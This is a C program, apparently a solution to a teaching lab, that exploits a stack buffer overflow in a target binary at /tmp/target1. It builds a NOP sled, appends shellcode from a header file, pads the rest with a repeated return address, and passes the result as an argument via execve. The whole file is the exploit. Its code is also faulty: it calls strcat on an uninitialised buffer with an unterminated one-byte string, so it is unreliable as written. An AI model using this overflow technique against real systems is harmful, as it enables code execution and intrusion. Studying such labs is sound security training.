#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  int shell = strlen(shellcode);
  int len = 1000;
  int i = 0;
  int t = shellcode[0];

  char str[len];
  char val[1] = "\x90";

  for (i = 0; i < 300; i++) {
    strcat(str, val);
  }

  int j =0;
  for (i; i < 500; i) {
    for (j = 0; j < shell; j++) {
      str[i++] = shellcode[j];  
    }
  }

  for(i; i < len; i) {
    str[i++] = '\xfc';
    str[i++] = '\xff';
    str[i++] = '\xbf';
    str[i++] = '\x60';
    //str[i++] = '\xfc';
  }

  args[1] = str;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
